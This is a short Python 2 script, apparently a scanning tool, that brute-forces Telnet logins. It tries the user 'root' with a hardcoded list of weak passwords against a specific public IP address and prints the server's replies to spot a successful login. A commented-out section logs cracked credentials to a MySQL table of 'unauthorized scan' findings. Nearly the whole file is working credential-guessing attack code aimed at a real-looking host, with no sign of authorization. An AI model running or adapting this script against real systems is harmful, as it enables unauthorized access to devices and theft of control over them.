# -*- coding: utf-8 -*-
# @Time    : 2018/4/24 0024 21:38
# @Author  : Langzi
# @Blog    : www.langzi.fun
# @File    : telnet.py
# @Software: PyCharm
import sys
import telnetlib
import time
import time

pas=['admin','123456','ROOT','abc','987654']
def scan(ip):
    uuser = 'root'
    for ppass in pas:
        try:
            tn = telnetlib.Telnet(ip, timeout=10)
            tn.set_debuglevel(5)
            tn.read_until("\r\nUsername:")
            #tn.read_until("\r\r\nFW_Master login: ")
            #tn.read_until("gin:")
            tn.write(uuser.encode('ascii') + "\r\n".encode('ascii'))
            #tn.read_until("\r\nPassword:")
           # tn.read_until("\r\nPassword:")
            tn.read_until("ord:")
            tn.write(ppass.encode('ascii') + "\r\n".encode('ascii'))
            result = tn.read_some()
            #result = result + tn.read_some()
            print '----------------------------'
            print result
            print '----------------------------'
            if 'Login failed' in result or 'Login incorrect' in result or result==' ' or result == '******':
                print '\n'
                print '*******login fail*******'
            else:
                print '\n'
                print '-*-*-*-*-*-*-*-*-*-*-*-*-*-*-**-'
        except Exception,e:
            print e


scan('119.184.122.191')

# try:
#     timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
#     coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8', )
#     cur_uauth_1 = coon_uauth_1.cursor()
#     sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
#     cur_uauth_1.execute(sql_uauth_1, (
#         str(url), str(ip + ':23|' + str(uuser) + '|' + str(ppass)), str('Telnet弱口令漏洞'),
#         str(unauthorizedscan_title), str(timenow)))
#     coon_uauth_1.commit()
#     cur_uauth_1.close()
#     coon_uauth_1.close()
#     time.sleep(random.randint(2, 4))
#     return ''
# except Exception, e:
#     pass